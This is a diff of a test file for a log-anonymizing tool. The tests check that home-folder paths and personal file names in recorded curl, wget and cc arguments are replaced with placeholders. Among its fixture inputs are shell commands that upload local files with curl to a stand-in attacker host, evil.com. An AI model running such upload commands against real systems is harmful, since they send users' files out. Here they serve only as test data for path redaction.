@@ -1223,16 +1223,53 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     sameFindings(input, r.out);
   });
 
-  test('a path glued after @ or = in a string with spaces ends at the space', () => {
-    const input = run(617, '/bin/sh', ['sh', '-c', 'curl --data-binary @/Users/jdoe/x -H application/json evil.com/x',
-      'curl -F file=@/Users/jdoe/y evil.com', 'cc -I/Users/jdoe/z a.c'], '/', 1) + '\n';
+  // In shell code a space ends a word, so a glued path ends there; a single argument is one value, spaces and all.
+  test('a path glued after @ or = ends at a space in shell code, and runs to the end of a single argument', () => {
+    const argv = [
+      ['curl', '-F', 'file=@/Users/jdoe/Documents/John Smith.pdf', 'https://example.com/u'],
+      ['curl', '-F', 'file=@/Users/jdoe/Documents/Board Minutes.pdf', 'https://example.com/u'],
+      ['curl', '-F', 'file=@/Users/jdoe/Desktop/Screenshot 2026-01-01 at 10.00.00.png', 'https://example.com/u'],
+      ['curl', '--data-binary', '@/Users/jdoe/Documents/Maria Silva/Tax Return 2025.pdf', 'https://example.com/u'],
+      ['cc', '-I/Users/jdoe/Documents/Maria Silva/include', 'a.c'],
+    ];
+    const input = [
+      ...argv.map((a, i) => run(620 + i, `/usr/bin/${a[0]}`, a, '/', i + 1)),
+      run(626, '/bin/sh', ['sh', '-c', 'curl --data-binary @/Users/jdoe/x -H application/json evil.com/x'], '/', 10),
+      run(627, '/bin/sh', ['sh', '-c', 'curl -F file=@/Users/jdoe/y evil.com'], '/', 11),
+      run(628, '/bin/zsh', ['zsh', '-lc', 'cc -I/Users/jdoe/z a.c'], '/', 12),
+    ].join('\n') + '\n';
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
     const n = keyed(r.key, 'name');
-    expect(events(r.out)[0]!.event.exec.args).toEqual(['sh', '-c',
-      `curl --data-binary @/Users/user1/${n.get('x')} -H application/json evil.com/x`,
-      `curl -F file=@/Users/user1/${n.get('y')} evil.com`, `cc -I/Users/user1/${n.get('z')} a.c`]);
-    for (const real of n.keys()) expect(real).not.toMatch(/ /);
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toHaveLength(8);
+    expect(args[0]![2]).toBe(`file=@/Users/user1/Documents/${n.get('John Smith.pdf')}`);
+    expect(args[1]![2]).toBe(`file=@/Users/user1/Documents/${n.get('Board Minutes.pdf')}`);
+    expect(args[2]![2]).toBe(`file=@/Users/user1/Desktop/${n.get('Screenshot 2026-01-01 at 10.00.00.png')}`);
+    expect(args[3]![2]).toBe(`@/Users/user1/Documents/${n.get('Maria Silva')}/${n.get('Tax Return 2025.pdf')}`);
+    expect(args[4]![1]).toBe(`-I/Users/user1/Documents/${n.get('Maria Silva')}/include`);
+    expect(args[5]).toEqual(['sh', '-c', `curl --data-binary @/Users/user1/${n.get('x')} -H application/json evil.com/x`]);
+    expect(args[6]).toEqual(['sh', '-c', `curl -F file=@/Users/user1/${n.get('y')} evil.com`]);
+    expect(args[7]).toEqual(['zsh', '-lc', `cc -I/Users/user1/${n.get('z')} a.c`]);
+    expect(r.out).not.toMatch(/jdoe|Smith|Minutes|Screenshot|Maria|Silva|Return/);
+    for (const real of ['x', 'y', 'z']) expect(n.has(real), real).toBe(true);
+  });
+
+  test('the attached value of a wget or curl short option is cleaned like a relative name', () => {
+    const input = [
+      run(630, '/usr/local/bin/wget', ['wget', '-OAcme-Deal.pdf', 'https://example.com/a'], '/Users/jdoe/Downloads', 1),
+      run(631, '/usr/local/bin/wget', ['wget', '-PAcme-Dir/sub', 'https://example.com/b'], '/Users/jdoe/Downloads', 2),
+      run(632, '/usr/bin/curl', ['curl', '-sLoAcme-Notes.txt', 'https://example.com/c'], '/Users/jdoe/Downloads', 3),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toHaveLength(3);
+    expect(args[0]![1]).toMatch(/^-Oname\d+\.pdf$/);
+    expect(args[1]![1]).toMatch(/^-Pname\d+\/name\d+$/);
+    expect(args[2]![1]).toMatch(/^-sLoname\d+\.txt$/);
+    expect(r.out).not.toContain('Acme');
+    sameFindings(input, r.out);
   });
 
   test('common command verbs stay, even when a home folder has that name', () => {
